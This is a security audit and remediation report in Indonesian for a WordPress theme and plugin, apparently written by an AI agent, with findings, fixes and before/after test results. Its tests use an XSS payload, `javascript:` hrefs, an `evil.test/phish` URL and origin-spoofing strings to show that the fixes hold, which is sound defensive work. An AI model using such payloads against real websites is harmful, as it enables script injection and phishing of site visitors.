# Security Audit — Layar Katalog (Theme + Core Plugin)

Tanggal audit: **2026-10-14** · Commit: `2a06d44` · Auditor: Arena.ai Agent Mode
Ruang lingkup: `themes/layar-katalog/`, `child-theme/layar-katalog-child/`, `plugins/layar-katalog-core/` (kode orisinal), `composer.lock` + `vendor/` (versi dependency), aset JS, service worker.

Metode: static review penuh (bukan scan otomatis), penelusuran semua sink berbahaya (`innerHTML`, `echo` tanpa escape, `$_GET/$_POST`, `$wpdb`, `error_log`, `register_rest_route`, `admin_post_*`), plus pengecekan dependency terhadap **GitHub Advisory Database** (live, 2026-10-14).

> **Konteks penting:** proyek ini adalah **tema + plugin WordPress (PHP)**, bukan aplikasi backend Node/Express. Beberapa poin dari daftar 20 item (payment server, harga, webhook pihak ketiga, source map bundler) **tidak ada padanannya di repo** dan ditandai `N/A` dengan penjelasan, bukan diabaikan.

---

## Ringkasan skor

| # | Item | Status | Risiko |
|---|---|---|---|
| 1 | Rate limit API | ❌ Belum ada | **Tinggi** |
| 2 | CORS ketat | ⚠️ Ikut default WP (longgar) | **Sedang** |
| 3 | CSRF protection | ✅ Ada (admin + REST rating) | Rendah |
| 4 | Cegah SSRF | ✅ Kuat (allowlist push service) | Rendah |
| 5 | Cegah path traversal | ✅ Tidak ada sink file dari input user | Aman |
| 6 | Validasi input API | ⚠️ Baik, 2 celah (body tanpa batas, `page` tanpa batas) | **Sedang** |
| 7 | Validasi output API | ⚠️ Baik di PHP, **DOM XSS di `player.js`** | **Tinggi** |
| 8 | Admin route terlindungi | ✅ `manage_options` + nonce di semua handler | Rendah |
| 9 | Default password & titik sensitif | ⚠️ Tidak ada kredensial hardcoded; VAPID key plaintext di DB | **Sedang** |
| 10 | Audit endpoint | ❌ Tidak ada audit trail / inventaris | **Sedang** |
| 11 | Verifikasi webhook | ⚠️ Tidak ada webhook masuk; unsubscribe = bearer-secret | Rendah |
| 12 | Cek payment server | ✅ N/A — tidak ada fitur pembayaran | N/A |
| 13 | Harga anti-tamper | ✅ N/A — tidak ada harga; analog (rating) sudah server-side | N/A |
| 14 | Cek IDOR | ✅ Tidak ada IDOR pada rating | Rendah |
| 15 | Log jangan bocor secret | ⚠️ **Exception Guzzle bocorkan push endpoint ke `debug.log`** | **Sedang** |
| 16 | Private source map | ✅ Tidak ada build/`.map` sama sekali | Aman |
| 17 | Update dependency | ✅ Bersih dari semua advisory (per 2026-10-14) | Rendah |
| 18 | Tes restore backup | ❌ Tidak ada runbook/skrip | **Sedang** |
| 19 | Security header | ❌ Tidak ada CSP/HSTS/XFO/nosniff/referrer | **Tinggi** |
| 20 | Tes security sebelum live | ❌ Tidak ada test, CI, atau PHPCS | **Tinggi** |

**Ringkas: 5 ✅ lulus · 5 ⚠️ sebagian · 6 ❌ belum ada · 4 N/A (dengan analog yang aman).**
Temuan paling mendesak saat audit: **DOM XSS di `player.js`** (F-01), **tidak ada rate limiting** (F-02), **tidak ada security header** (F-03), **kebocoran endpoint push ke log** (F-06).

> **Pembaruan 2026-10-14 — P0 sudah diterapkan.** F-01, F-02 (rate limit + batas langganan), F-03 tahap 1, F-05, F-06, F-08, dan F-11 sudah diperbaiki di **Core Plugin 1.4.1 / Theme 1.6.2**. Lihat bagian *Remediasi P0* di bawah untuk diff, bukti pengujian, dan sisa pekerjaan. Tabel di atas tetap menampilkan **kondisi saat audit** agar temuan aslinya tidak hilang.

> **Pembaruan 2026-10-17 — P1 sudah diterapkan.** CORS ketat (poin 2), validasi input + batas ukuran body (poin 6), audit trail (poin 10 / F-13), CSP report-only beserta kolektor laporannya (F-03), dan pengetatan cache service worker (F-07) selesai di **Core Plugin 1.5.0 / Theme 1.6.3**, lengkap dengan bukti pengujian (105 assertion PHP + 18 assertion service worker). Pekerjaan ini sekaligus menemukan **F-15 — fatal parse error di berkas utama plugin** yang membuat plugin tidak pernah bisa diaktifkan sejak commit pertama. Lihat bagian *Remediasi P1*.
>
> **Pembaruan 2026-10-17 — P2 juga sudah diterapkan.** Enkripsi kunci VAPID at-rest (poin 9), paksa HTTPS untuk URL video/subtitle (F-10), cron pruning langganan push basi (F-12), blokir akses web ke `vendor/` + `index.php` di tiap direktori (F-09), CI GitHub Actions beserta suite uji di `tests/` (F-04/poin 20), dan runbook backup-restore (poin 18) selesai di **Core Plugin 1.6.0 / Theme 1.6.4**. Suite uji itu menemukan **F-16 — `<track>` subtitle terduplikasi setiap ganti sumber video**. Yang tersisa seluruhnya spesifik-situs. Lihat bagian *Remediasi P2*.
>
> **Pembaruan 2026-10-17 — P3 menutup sisa pekerjaan P2.** Mode CSP ketat berbasis nonce (`lkc_csp_strict`) menggantikan `'unsafe-inline'`, tab CSP kini menyusun sendiri snippet allowlist dari laporan pelanggaran, job coding standards di CI menjadi blocking atas pelanggaran baru, dan dua skrip staging (`tests/wp/`) mengotomatiskan uji aktivasi serta latihan restore kuartalan — lengkap dengan uji atas pengaman destruktif keduanya. Selesai di **Core Plugin 1.7.0 / Theme 1.7.0**, dan menemukan **F-17 — atribut `style=` inline di template blok**. Lihat bagian *Remediasi P3*.

> **Pembaruan 2026-10-17 — verifikasi menutup dua batas yang tersisa di dalam repo.** Kedua skrip `tests/wp/` akhirnya *dijalankan*, bukan hanya dibaca: `tests/wp/simulated-install.test.sh` (118 assertion) membuktikannya terhadap WordPress tersimulasi. Dan mode CSP ketat tidak lagi hanya disimpulkan dari kode — `tests/php/csp-strict.test.php` (45 assertion) mem-*emit* header dan dokumen dari sumber shipped di sandbox WebAssembly, lalu `tests/js/csp-strict-roundtrip.test.js` (20 assertion) mengurai dokumen itu dengan jsdom dan menilainya memakai matcher CSP dari auditor yang sama. Ronde ini menemukan **F-18 — atribut `style` inline yang tidak bisa di-nonce**: dua sumber di kode shipped ditutup, sisanya ditangani lewat satu konsesi terdokumentasi (`style-src-attr`). Lihat bagian *Remediasi P3* dan *Persiapan eksekusi*.

---

## Remediasi P0 — sudah diterapkan (2026-10-14)

Rilis: **Core Plugin 1.4.1 / Theme 1.6.2**. Berkas baru: `plugins/layar-katalog-core/includes/security.php`.

| Temuan | Perbaikan | Berkas |
|---|---|---|
| **F-01** DOM XSS | Overlay dibangun dengan `createElement` + `textContent` (tidak ada `innerHTML` sama sekali), judul dibaca dari elemen `<strong>` bukan dari seluruh link, dan URL divalidasi `isSafeUrl()` → hanya `http:`/`https:` | `player.js:79-148` |
| **F-02** Rate limit | Filter `rest_pre_dispatch` membatasi **semua** route `/lkc/v1`: default 60 baca + 10 tulis per menit per pengunjung, balas `429` + `Retry-After`. Fixed-window (TTL tidak digeser ulang), identitas = user ID atau HMAC-SHA256(IP, auth salt) sehingga IP mentah tidak pernah tersimpan | `includes/security.php:75-206` |
| **F-02** Batas langganan | `lkc_push_subscription_table_is_full()` menolak endpoint **baru** bila tabel ≥ 5000 baris (`503`); subscriber lama tetap bisa refresh kunci | `includes/web-push.php:253-271, 339-348` |
| **F-03** Security header | `send_headers` mengirim `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: SAMEORIGIN`, `Permissions-Policy`, dan HSTS 1 tahun + `includeSubDomains` bila HTTPS. Semua bisa diubah/dimatikan lewat filter `lkc_security_headers`. CSP **sengaja belum** dipasang (lihat catatan di bawah) | `includes/security.php:24-64` |
| **F-06** Log bocor secret | Helper `lkc_log_push_error()` mengganti kedua `error_log( ... $error->getMessage() )`. Yang dicatat hanya: stage, `get_class($error)`, kode HTTP bila ada, dan 8 karakter pertama `subscription_hash`. Tidak ada URL, tidak ada kunci | `includes/web-push.php:37-65, 481, 515` |
| **F-05** innerHTML + localStorage | Nilai resume di-`Number()` dulu, lalu `data-lkc-resume-from` diset lewat `setAttribute()` bukan dirangkai ke string HTML | `assets/engagement.js:326-338` |
| **F-08** `$version` tak terdefinisi | Ditambahkan `$version = wp_get_theme()->get( 'Version' );` di `layarkatalog_enqueue_google_fonts()` | `themes/layar-katalog/functions.php:351` |
| **F-11** `page` tanpa batas | `min( 500, max( 1, absint(...) ) )`, dipakai konsisten untuk `paged` **dan** field `page` pada respons | `layar-katalog-core.php:2164, 2168, 2264` |
| Cache-busting | `player.js` sekarang didaftarkan dengan versi `filemtime()` (sebelumnya string `'1.4.0'` yang beku) → perbaikan XSS benar-benar sampai ke browser setelah upgrade. Dua string versi hard-coded lain diganti `LKC_PLUGIN_VERSION` | `layar-katalog-core.php:973-985, 1558, 1738` |

### Bukti pengujian F-01

`player.js` revisi lama (HEAD) dan revisi baru dijalankan pada markup yang **persis** dihasilkan `lkc_episode_navigation_shortcode()` untuk judul episode berbahaya `<img src=x data-pwned="1">` (di-render PHP sebagai entity, jadi `textContent` mengembalikan payload mentah), lalu event `ended` dipicu pada `<video>`:

```
=== SEBELUM FIX (HEAD) ===                === SESUDAH FIX ===
PASS  overlay is rendered                 PASS  overlay is rendered
FAIL  payload NOT a live element (true)   PASS  payload NOT a live element (false)
FAIL  no <img> node inside overlay (=1)   PASS  no <img> node inside overlay (=0)
FAIL  title kept as literal text          PASS  title kept as literal text
PASS  link href is the episode URL        PASS  link href is the episode URL
PASS  countdown shows initial seconds     PASS  countdown shows initial seconds
PASS  cancel button present               PASS  cancel button present
PASS  cancel button label intact          PASS  cancel button label intact
FAIL  javascript: href refused            PASS  javascript: href refused (no overlay)
PASS  countdown ticks down                PASS  countdown ticks down
PASS  cancel removes overlay              PASS  cancel removes overlay
```

Versi lama menghasilkan `<img src="x" data-pwned="1">` sebagai **elemen hidup** di dalam overlay, kehilangan judul asli (yang muncul justru label "Episode berikutnya"), dan menerima `href="javascript:..."` sampai jsdom mencoba mengeksekusi `alert()`. Versi baru mempertahankan judul sebagai teks literal dan menolak skema non-`http(s)` tanpa merender overlay sama sekali. Harness ini sementara berada di luar repo; memindahkannya ke `tests/` adalah bagian dari pekerjaan P2 (CI).

### Catatan keputusan

- **CSP belum dipasang** (tetap di P1). Tema mencetak kode iklan dari administrator ke `wp_head` (`layarkatalog_output_global_ad_code`, `layarkatalog_ad_slot_shortcode`), jadi `script-src` tanpa `'unsafe-inline'` akan langsung mematikan fitur iklan. Jalur yang benar: `Content-Security-Policy-Report-Only` dulu dengan allowlist penyedia iklan/font/push, baru enforcing. Filter `lkc_security_headers` sudah tersedia untuk menambahkannya tanpa menyentuh kode plugin.
- **`X-Frame-Options: SAMEORIGIN`** aman untuk Customizer dan block editor (iframe same-origin). Situs dengan domain mapping yang memisahkan host admin dan frontend perlu menghapus header ini lewat filter.
- **Rate limit berbasis transien** memakai penyimpanan default WordPress. Pada situs dengan object cache eksternal (Redis/Memcached) ini otomatis menjadi terdistribusi; tanpa itu, setiap node di cluster multi-server punya penghitung sendiri. Untuk lalu lintas tinggi, tetap pasang `limit_req` di Nginx/CDN sebagai lapisan pertama.
- **`lkc_rate_limit_ip` wajib dikonfigurasi** bila situs berada di belakang proxy/CDN, karena `REMOTE_ADDR` akan berisi alamat proxy untuk semua pengunjung dan seluruh audiens masuk ke satu bucket.

### Sisa pekerjaan

- **P1: ✅ selesai 2026-10-17** — lihat bagian *Remediasi P1* di bawah.
- **P2:** CI (php -l, PHPCS/WPCS, PHPStan, `composer audit`) + unit test (F-04/poin 20) · cron pruning langganan basi (F-12) · `index.php` + blokir akses web ke `vendor/` (F-09) · paksa HTTPS untuk URL video/subtitle (F-10) · runbook backup-restore (poin 18) · enkripsi kunci VAPID at-rest (poin 9).

---

## Remediasi P1 — sudah diterapkan (2026-10-17)

Rilis: **Core Plugin 1.5.0 / Theme 1.6.3**. Berkas baru: `plugins/layar-katalog-core/includes/audit.php`. Ditulis ulang: `includes/security.php`, `service-worker.js`.

| Temuan | Perbaikan | Berkas |
|---|---|---|
| **F-15** *(baru, Kritis)* | Fatal parse error diperbaiki: `foreach ( $title_meta as $meta_key => $args ) {` di `lkc_register_meta()` sempat terganti `$episode_meta = array(`. Plugin tidak bisa diaktifkan sama sekali | `layar-katalog-core.php:272` |
| **Poin 2** CORS longgar | Allowlist origin: `lkc_normalize_origin()` + `lkc_is_allowed_origin()` (default hanya `home_url()`, filter `lkc_allowed_cors_origins`). Origin tak dikenal kehilangan **semua** header `Access-Control-Allow-*` yang dipantulkan core, `Vary: Origin` selalu dikirim. Dipasang di `rest_pre_serve_request` **dan** `rest_post_dispatch` (prio 20, 3 arg) agar berlaku lintas versi WP | `includes/security.php:19-38, 238-283, 363-388` |
| **F-03** CSP | `Content-Security-Policy-Report-Only` dengan 12 direktif + `report-uri`. Mode lewat filter `lkc_csp_mode` (`report-only`/`enforce`/`off`), direktif lewat `lkc_content_security_policy`. Builder menolak nama direktif yang bukan satu token dan sumber yang memuat `;` atau newline, sehingga filter pihak ketiga tidak bisa menyelundupkan direktif kedua | `includes/security.php:41-155` |
| **F-03** Kolektor CSP | Route anonim `POST lkc/v1/csp-report`: dukung format CSP2 (`csp-report`) dan CSP3 (flat), hanya nama direktif yang disimpan, query string dokumen dibuang, agregasi per sidik jari `sha256[:32]`, plafon 500 baris (`lkc_csp_report_max_rows`), body > 2 KB ditolak, selalu `204` tanpa refleksi | `includes/audit.php:215-352` |
| **F-07** SW cache | Ditulis ulang sebagai `lk-shell-v2`. `isCacheable()` mewajibkan `response.ok` **dan** `type === 'basic'`, menolak header `X-LK-Personalized` serta `Cache-Control: private`/`no-store`, dan menolak URL `preview`/`customize_changeset_uuid`/`customize_autosave`/`lk_no_cache`. `activate` menghapus cache `lk-*` lain (HTML personal versi lama ikut terbuang). `notificationclick` hanya membuka URL same-origin | `service-worker.js:11-99, 178-199` |
| **F-07** Sinyal personalisasi | Header `X-LK-Personalized: 1` dikirim untuk respons login/pratinjau (`lkc_is_personalized_response()`), di luar filter `lkc_security_headers` karena ini sinyal kebenaran, bukan pilihan kebijakan | `includes/security.php:158-170, 216-224` |
| **F-13**/poin 10 audit trail | Tabel `wp_lkc_audit_log` + halaman **Alat → Log Keamanan** (tab Audit/CSP, paginasi 50, hapus ber-nonce). IP & User-Agent disimpan sebagai HMAC-SHA256 dengan `wp_salt('auth')`, bukan mentah. Aksi dibatasi allowlist `lkc_audit_log_actions`. Cron harian `lkc_prune_security_logs`: audit 90 hari, laporan tak terlihat 30 hari | `includes/audit.php:13-213, 354-406, 409-631` |
| **Poin 6** validasi input | `/push/subscribe` dan `/push/unsubscribe` kini punya skema `args` (`endpoint`, `keys`, `contentEncoding` default `aes128gcm`) dengan `validate_callback`/`sanitize_callback`; callback membaca `get_param()` | `includes/web-push.php:301-338, 341-380` |
| **Poin 6** batas body | `lkc_reject_oversized_rest_body()` di `rest_pre_dispatch` prio 20: tolak `413 lkc_payload_too_large` bila `Content-Length` **atau** panjang body aktual melebihi `lkc_rest_max_body_bytes` (default 8 KB) | `includes/security.php:495-546` |
| Rate limit ↔ CSP | `/lkc/v1/csp-report` dikecualikan dari rate limiter (satu page view bisa memicu banyak laporan); logika bucket dipindah ke `lkc_rest_rate_limit_buckets()` | `includes/security.php:399-433` |
| Audit push | `push_settings_saved` (hanya `enabled on/off` + `subject_changed yes/no`, tanpa secret), `vapid_keys_rotated`, `push_subscriptions_cleared` (jumlah baris), `push_subscription_rejected` (`invalid_payload`/`table_full`), dan `lkc_log_push_error('key_generation', …)` di catch | `includes/web-push.php:113, 151, 174, 408, 424` |
| Audit tema | `layarkatalog_audit_ad_code_change()` di `update_option_layarkatalog_ads`/`add_option_layarkatalog_ads`: membandingkan `global_head.code` dan tiap `slots[*].code`, mencatat **nama slot** yang berubah, tidak pernah isi kodenya | `themes/layar-katalog/functions.php:644-679` |
| CSP tema | `layarkatalog_allow_font_origins_in_csp()` menambah `fonts.googleapis.com` ke `style-src` dan `fonts.gstatic.com` ke `font-src`, **hanya** bila theme mod `layarkatalog_google_font` terisi; idempoten | `themes/layar-katalog/functions.php:398-415` |

### F-15 — fatal parse error (temuan baru, severity: Kritis)

**Bukti.** Saat memverifikasi pekerjaan P1, setiap berkas PHP proyek di-*parse* dengan runtime PHP 8.2.33 asli (WebAssembly) memakai `token_get_all( $src, TOKEN_PARSE )`. Delapan berkas lolos; `plugins/layar-katalog-core/layar-katalog-core.php` gagal:

```
ParseError line 271: syntax error, unexpected token ";", expecting ")"
```

Penyebabnya di `lkc_register_meta()`: baris pembuka loop pertama terganti oleh awal literal array, sehingga `$title_meta` tidak pernah dipakai dan tubuh `foreach` berubah menjadi isi `array(`:

```php
$episode_meta = array(          // ← seharusnya: foreach ( $title_meta as $meta_key => $args ) {
    $args['single']        = true;
    ...
    register_post_meta( 'lk_title', $meta_key, $args );
}
```

**Dampak.** Berkas utama plugin tidak dapat di-*parse*, jadi plugin **tidak pernah bisa diaktifkan** ("plugin could not be activated because it triggers a fatal error"). Semua kontrol keamanan, CPT, REST route, dan push tidak pernah berjalan. Kesalahan ini ada sejak commit pertama yang menambahkan berkas tersebut, bukan dari pekerjaan remediasi.

**Perbaikan.** Baris dikembalikan menjadi `foreach ( $title_meta as $meta_key => $args ) {` (`layar-katalog-core.php:272`). Setelah itu seluruh 9 berkas PHP proyek lolos *parse* PHP 8.2.33.

**Pelajaran untuk poin 20.** Ini persis kasus yang seharusnya ditangkap CI dengan `php -l` pada setiap berkas — biaya satu detik, dan tanpa itu sebuah *fatal error* bisa masuk ke branch utama dan bertahan lintas rilis. `php -l` untuk semua berkas + PHPCS tetap menjadi item P2 teratas.

### Bukti pengujian P1

**1. Parse PHP asli (semua berkas proyek).** PHP 8.2.33 via WebAssembly, `token_get_all(..., TOKEN_PARSE)`:

| Berkas | Sebelum | Sesudah |
|---|---|---|
| `layar-katalog-core.php` | ❌ ParseError baris 271 | ✅ 25.344 token |
| `includes/audit.php` (baru) | — | ✅ 4.937 token |
| `includes/security.php` | — | ✅ 2.492 token |
| `includes/web-push.php` | — | ✅ 5.992 token |
| `includes/engagement.php`, tema `functions.php`, child theme, 2 pattern | ✅ | ✅ |

**2. Uji unit logika keamanan — 105 assertion, 0 gagal.** Kode plugin asli dimuat dengan WordPress di-*stub* (hook registry, `$wpdb` palsu yang merekam semua tulis, transien, `home_url`/`rest_url`/`wp_salt`). Cakupan:

- `lkc_normalize_origin()` — 9 assertion: lowercasing, pembuangan port default 443/80, penolakan `file:`, `javascript:`, string tanpa skema, dan input kosong.
- `lkc_is_allowed_origin()` — 10 assertion: same-origin lolos; `evil.test`, subdomain, penurunan skema HTTP, `notexample.test` (serangan sufiks), dan `example.test.evil.test` (serangan prefiks) semuanya ditolak; filter dapat memperluas allowlist tanpa melonggarkan yang lain.
- CSP — 16 assertion: `default-src 'self'`, `object-src 'none'`, `base-uri`/`form-action`/`frame-ancestors 'self'`, `report-uri` menuju kolektor, ≥ 10 direktif; mode default `report-only`, `enforce` mengganti nama header, `off` tidak mengirim apa pun.
- **Filter bermusuhan** — 4 assertion: sumber berisi `;`, sumber berisi newline di awal, dan nama direktif `"bad\nkey"` semuanya dibuang; sumber yang sah di antaranya tetap lolos.
- Sinyal personalisasi — 3 assertion: login dan pratinjau ditandai, pengunjung anonim tidak.
- Rate limiter — 14 assertion: identitas anonim = hash bergaram (bukan IP mentah), `u3` untuk user login, dua IP → dua bucket, pemetaan GET→`read` / POST→`write`, route core dan `csp-report` tidak kena bucket, **tulis ke-11 diblokir** (`429` + `Retry-After` + `no-store`), **baca tepat 60 lolos**.
- Batas body — 5 assertion: `Content-Length` berlebih → `413 lkc_payload_too_large`; `Content-Length` yang berbohong tetap tertangkap karena panjang body diukur; GET tidak diperiksa.
- Audit — 15 assertion: allowlist aksi, penolakan aksi tak dikenal, `rating_saved` opt-in, baris masuk ke `wp_lkc_audit_log`, `actor_login` tercatat, **IP dan UA tersimpan sebagai hash 64 karakter dan tidak memuat nilai mentah**.
- Kolektor CSP — 18 assertion: `204` tanpa body, satu baris agregasi, hanya nama direktif disimpan, host terblokir dipisah dari path, **query string dokumen dibuang**, hash 32 karakter, laporan berulang menaikkan penghitung (bukan menyisipkan baris), format CSP3 flat diterima, kata kunci `inline` dipertahankan, body > 2 KB / tanpa direktif / bukan JSON ditolak dan tidak disimpan.
- Filter tema — 16 assertion: Google Fonts hanya ditambahkan bila theme mod terisi, sumber lama dipertahankan, idempoten, input non-array dikembalikan apa adanya; perubahan kode iklan tercatat dengan **nama slot** dan **tanpa isi kode**, `add_option_*` (argumen 1 = nama opsi) tertangani, opsi tak berubah tidak mencatat apa pun.

**3. Uji diferensial service worker — 18 assertion.** `service-worker.js` dimuat ke `ServiceWorkerGlobalScope` tiruan di Node (tanpa dependensi), event `fetch`/`activate`/`notificationclick` sintetis dikirim, lalu isi Cache Storage diperiksa.

| Assertion | Versi lama (HEAD) | Versi baru |
|---|---|---|
| HTML publik anonim di-cache | PASS | PASS |
| Respons `X-LK-Personalized` **tidak** di-cache | **FAIL** | PASS |
| Respons `private, no-store` **tidak** di-cache | **FAIL** | PASS |
| Respons 404 **tidak** di-cache | **FAIL** | PASS |
| Respons 500 **tidak** di-cache | **FAIL** | PASS |
| Respons opaque (lintas origin) **tidak** di-cache | **FAIL** | PASS |
| URL `?preview=true` **tidak** di-cache | **FAIL** | PASS |
| URL `customize_changeset_uuid` **tidak** di-cache | **FAIL** | PASS |
| Aset CSS statis tetap di-cache | PASS | PASS |
| POST / REST / wp-admin / lintas origin diabaikan | PASS ×4 | PASS ×4 |
| URL notifikasi lintas origin **tidak** dibuka | **FAIL** (membuka `https://evil.test/phish`) | PASS (fallback `/`) |
| URL notifikasi same-origin tetap dipakai | PASS | PASS |
| `activate` membuang cache `lk-*` lama, menyimpan yang baru, tidak menyentuh cache plugin lain | FAIL ×2 | PASS ×3 |
| **Total** | **10 FAIL / 18** | **18 PASS / 18** |

### Catatan keputusan P1

- **`'unsafe-inline'` masih ada di `script-src` dan `style-src`.** Tema mencetak kode iklan dari administrator ke `wp_head`, jadi menghilangkannya sekarang akan mematikan fitur iklan dan Customizer. Jalur yang benar: jalankan `report-only`, buka **Alat → Log Keamanan → CSP**, daftarkan domain nyata lewat `lkc_content_security_policy`, pindahkan kode iklan ke berkas `.js` di domain yang di-allowlist, baru set `lkc_csp_mode` → `'enforce'`. Karena default-nya report-only, memasang rilis ini tidak bisa merusak situs yang sedang berjalan.
- **Kenapa header `X-LK-Personalized`, bukan memeriksa cookie.** Service worker tidak punya akses ke `document.cookie` untuk cookie `httpOnly`, dan `Set-Cookie` tidak terbaca lewat Headers API dari dalam SW. Header respons adalah satu-satunya sinyal yang bisa dibaca SW, dan sisi server tahu persis apakah HTML itu personal.
- **Kenapa laporan CSP diagregasi.** Route ini anonim dan bisa dipanggil siapa saja. Tanpa agregasi + plafon baris, satu penyerang bisa mengisi tabel dengan URL unik. Setiap laporan dilipat ke satu baris per (direktif, host terblokir, path terblokir, path dokumen) dan penghitungnya yang naik.
- **Kenapa `csp-report` dikecualikan dari rate limit.** Browser mengirim satu laporan per sumber daya yang diblokir; satu page view dengan 12 skrip pihak ketiga langsung menghabiskan bucket tulis 10/menit dan membuat pengguna sah kena `429` di endpoint lain. Batas yang benar untuk route ini adalah ukuran body (2 KB) dan plafon baris (500).
- **Kenapa aksi audit memakai allowlist, bukan mencatat semua.** `rating_saved` dan `push_subscription_saved` bervolume tinggi dan akan menenggelamkan sinyal keamanan yang jarang terjadi. Keduanya tersedia lewat `lkc_audit_log_actions` bila sebuah situs memang sedang menyelidiki manipulasi rating atau pertumbuhan langganan.
- **Kenapa IP/UA di-hash.** Log audit ada untuk menjawab "aksi apa berubah oleh siapa dan kapan", bukan untuk melacak orang. HMAC dengan `wp_salt('auth')` tetap membuat dua permintaan dari klien yang sama bisa dikorelasikan, tanpa menyimpan data pribadi yang bisa bocor lewat cadangan database.
- **Kenapa bump cache service worker ke `lk-shell-v2`.** Pengunjung yang sudah terpasang SW lama mungkin menyimpan HTML personal di Cache Storage. Menaikkan nama cache membuat `activate` membuang semua cache `lk-*` lain, jadi salinan lama hilang tanpa perlu intervensi pengguna.

### Sisa pekerjaan setelah P1

- **P2: ✅ selesai 2026-10-17** — lihat bagian *Remediasi P2* di bawah.

---

## Remediasi P2 — sudah diterapkan (2026-10-17)

Rilis: **Core Plugin 1.6.0 / Theme 1.6.4**. Berkas baru: `tests/` (7 berkas), `.github/workflows/ci.yml`, `phpcs.xml.dist`, `docs/BACKUP-RESTORE.md`, delapan `index.php`, `plugins/layar-katalog-core/vendor/.htaccess`.

| Temuan | Perbaikan | Berkas |
|---|---|---|
| **F-04**/poin 20 CI & test | GitHub Actions empat job: `php -l` untuk **semua** berkas PHP (vendor dikecualikan), `node --check` untuk semua JS, suite PHP 152 assertion, suite SW 18 assertion, suite player 22 assertion, `composer audit --locked`, dan PHPCS/WPCS (advisory). Harness dipindah ke dalam repo: `tests/php/{bootstrap,security.test}.php`, `tests/js/{service-worker,player-dom-xss}.test.js`, `tests/lint-js.mjs`, plus runner WebAssembly `tests/php/{run,lint}-phpwasm.mjs` agar suite bisa dijalankan tanpa PHP terpasang | `.github/workflows/ci.yml`, `tests/`, `phpcs.xml.dist` |
| **F-16** *(baru)* | Bug: ganti sumber video **menduplikasi** `<track>`. `video.src = …` tidak menghapus anak `<track>`, jadi blok "pertahankan subtitle" menambah salinan kedua setiap kali; setelah dua kali ganti sumber menu subtitle berisi 4 entri "Indonesia". Diperbaiki: track asli dihapus sebelum ditambahkan ulang. Ditemukan oleh suite DOM baru | `player.js:45-61` |
| **Poin 9** VAPID plaintext | Kunci privat disimpan sebagai envelope `lkc1:<iv>:<tag>:<ciphertext>` AES-256-GCM, kunci enkripsi diturunkan dari salt `auth` + `secure_auth`. Nilai lama (plaintext) tetap terbaca dan dimigrasikan otomatis di `admin_init`; envelope yang tidak bisa didekripsi (salt berubah) memicu notice admin, bukan kegagalan senyap | `includes/web-push.php:16-140, 165, 250, 286` |
| **F-10** HTTP untuk media | `lkc_is_allowed_media_url()` dipakai kedua sanitizer: `http://` ditolak (filter `lkc_allow_insecure_media_urls` untuk mengizinkan kembali), host dapat dikunci lewat `lkc_allowed_media_hosts` (subdomain diizinkan, prefiks mirip ditolak). Hanya berjalan saat save sehingga konten lama tidak hilang | `layar-katalog-core.php:410-476, 481-497` |
| **F-12** langganan basi | Kolom `failure_count` + `last_failure_at` (dbDelta, `lkc_engagement_db_version` → `1.1`), dinaikkan tiap kegagalan kirim, dan cron harian `lkc_prune_stale_push_subscriptions` menghapus pada 5 kegagalan atau 30 hari gagal (filter `lkc_push_max_failures`, `lkc_push_stale_days`). Baris yang belum pernah gagal tidak pernah dihapus | `includes/engagement.php:37-49`, `includes/web-push.php:530-650, 725, 729` |
| **F-09** `vendor/` terbaca | `vendor/.htaccess` menolak semua permintaan (Apache 2.2 & 2.4, dengan ekuivalen nginx terdokumentasi di dalam berkasnya), dan `index.php` ditambahkan ke root plugin, `includes/`, `assets/`, `vendor/`, serta `assets/`, `languages/`, `parts/`, `templates/` tema | `plugins/layar-katalog-core/vendor/.htaccess`, 8× `index.php` |
| **Poin 18** runbook backup | `docs/BACKUP-RESTORE.md`: inventaris lengkap (4 tabel plugin, opsi `lkc_push_options` & `layarkatalog_ads`, theme mods, semua meta `_lk_*`, dan `wp-config.php`), perintah dump/restore, lima mode kegagalan yang nyata terjadi, checklist verifikasi 12 butir, dan log latihan kuartalan | `docs/BACKUP-RESTORE.md` |

### Bukti pengujian P2

| Suite | Assertion | Versi sekarang | Versi di `git HEAD` (`--previous`) |
|---|---|---|---|
| `tests/php/security.test.php` | 152 | **152 lulus, 0 gagal** | — (logika belum ada di HEAD) |
| `tests/js/service-worker.test.js` | 18 | **18 lulus, 0 gagal** | **9 gagal** (cache HTML login/pratinjau/404/500/opaque, buka `https://evil.test/phish`) |
| `tests/js/player-dom-xss.test.js` | 22 | **22 lulus, 0 gagal** | **8 gagal** (payload jadi `<img>` hidup, `javascript:`/`data:` diterima, track 2 lalu 4) |
| `tests/php/lint-phpwasm.mjs` | 18 berkas | **18/18 parse bersih** (PHP 8.2.33) | — |
| `tests/lint-js.mjs` | 15 berkas | **15/15 parse bersih** (Node 22) | — |

Cakupan baru yang diuji di P2: kebijakan transport & host media (16 assertion, termasuk penolakan `notcdn.example.test` dan `xcdn.example.test`), pruning langganan (9 assertion, termasuk bahwa cron hanya dijadwalkan sekali dan dibersihkan saat nonaktif), dan enkripsi kunci VAPID (17 assertion: roundtrip, IV acak, envelope rusak ditolak oleh GCM auth, salt berubah → tidak terbaca, migrasi legacy idempoten, public key tidak ikut dienkripsi).

### Catatan keputusan P2

- **PHPCS dibuat advisory (`continue-on-error: true`), bukan blocking.** Kode proyek ini lebih tua dari ruleset-nya; job yang merah permanen dan tidak bisa ditindaklanjuti hanya akan diabaikan orang. Laporan tetap dipublikasikan agar jumlahnya menyusut, dan job-nya tinggal dibalik menjadi blocking begitu bersih.
- **Kunci enkripsi diturunkan dari salt `wp-config.php`.** WordPress tidak menyediakan key store, dan salt adalah satu-satunya rahasia yang pasti ada serta tidak pernah masuk database. Konsekuensinya disengaja dan didokumentasikan: dump database tanpa `wp-config.php` jadi tidak berguna, dan rotasi salt membuat kunci lama tidak terbaca — yang ditampilkan sebagai notice admin dengan jalur pemulihan (buat ulang kunci), bukan kegagalan senyap.
- **Sanitizer media hanya berjalan saat save.** Menolak URL `http://` pada render akan membuat konten yang sudah terbit menghilang tanpa jejak. Karena browser sudah memblokir mixed content di halaman HTTPS, nilai penolakannya ada di titik input: editor langsung tahu URL-nya tidak akan dipakai.
- **Pruning memakai penghitung kegagalan, bukan umur langganan.** Langganan berumur 6 bulan yang belum pernah gagal adalah pelanggan sah yang sekadar menunggu episode berikutnya. Menghapus berdasarkan umur akan memutus notifikasi pengguna aktif; menghitung kegagalan hanya membuang baris yang memang sudah tidak bisa dikirim.
